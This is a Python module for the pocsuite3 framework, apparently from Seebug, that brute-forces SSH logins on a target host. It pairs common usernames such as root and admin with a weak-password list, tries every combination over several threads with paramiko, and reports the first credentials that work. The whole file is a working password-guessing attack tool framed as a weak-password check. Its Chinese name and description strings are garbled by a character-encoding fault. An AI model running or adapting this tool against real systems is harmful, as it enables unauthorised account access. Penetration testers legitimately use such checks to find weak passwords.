import itertools
import logging
import queue
import socket
from collections import OrderedDict

import paramiko

from pocsuite3.api import POCBase, Output, register_poc, logger, POC_CATEGORY, VUL_TYPE
from pocsuite3.lib.core.data import paths
from pocsuite3.lib.core.interpreter_option import OptInteger
from pocsuite3.lib.core.threads import run_threads


class DemoPOC(POCBase):
    vulID = '89688'
    version = '3'
    author = ['seebug']
    vulDate = '2018-09-18'
    createDate = '2018-09-18'
    updateDate = '2018-09-18'
    references = ['https://www.seebug.org/vuldb/ssvid-89688']
    name = 'SSH 寮卞瘑鐮?
    appPowerLink = ''
    appName = 'ssh'
    appVersion = 'All'
    vulType = VUL_TYPE.WEAK_PASSWORD
    desc = '''ssh 瀛樺湪寮卞瘑鐮侊紝瀵艰嚧鏀诲嚮鑰呭彲杩炴帴涓绘満杩涜鎭舵剰鎿嶄綔'''
    samples = ['']
    install_requires = ['paramiko']
    category = POC_CATEGORY.TOOLS.CRACK
    protocol = POC_CATEGORY.PROTOCOL.SSH

    def _options(self):
        o = OrderedDict()
        o["ssh_burst_threads"] = OptInteger(4, description='set ssh_burst_threads', require=False)
        return o

    def _verify(self):
        result = {}
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 22
        ssh_burst_threads = self.get_option("ssh_burst_threads")

        task_queue = queue.Queue()
        result_queue = queue.Queue()
        ssh_burst(host, port, task_queue, result_queue, ssh_burst_threads)
        if not result_queue.empty():
            username, password = result_queue.get()
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Username'] = username
            result['VerifyInfo']['Password'] = password
        return self.parse_attack(result)

    def _attack(self):
        return self._verify()

    def parse_attack(self, result):
        output = Output(self)

        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')

        return output


def get_word_list():
    common_username = ('ssh', 'test', 'root', 'guest', 'admin', 'daemon', 'user')
    with open(paths.WEAK_PASS) as f:
        return itertools.product(common_username, f)

def get_word_list_v2():
    common_username = ('alice', 'bob', 'tester', 'test00')
    with open(paths.WEAK_PASS) as f:
        return itertools.product(common_username, f)


def port_check(host, port=22):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect_ex((host, int(port)))
    if connect == 0:
        return True
    else:
        s.close()
        return False


def ssh_login(host, port, username, password):
    ret = False
    ssh = None
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(host, port, username, password, timeout=6)
        ret = True
    except Exception:
        pass
    finally:
        if ssh:
            ssh.close()
    return ret


def task_init(host, port, task_queue, reqult_queue):
    for username, password in get_word_list():
        task_queue.put((host, port, username.strip(), password.strip()))


def task_thread(task_queue, result_queue):
    while not task_queue.empty():
        host, port, username, password = task_queue.get()
        logger.info('try burst {}:{} use username:{} password:{}'.format(
            host, port, username, password))
        if ssh_login(host, port, username, password):
            with task_queue.mutex:
                task_queue.queue.clear()
            result_queue.put((username, password))


def ssh_burst(host, port, task_queue, result_queue, ssh_burst_threads):
    log = paramiko.util.logging.getLogger()
    log.setLevel(logging.CRITICAL)

    if not port_check(host, port):
        logger.warning("{}:{} is unreachable".format(host, port))
        return
    try:
        task_init(host, port, task_queue, result_queue)
        run_threads(ssh_burst_threads, task_thread, args=(task_queue, result_queue))
    except Exception:
        pass


register_poc(DemoPOC)
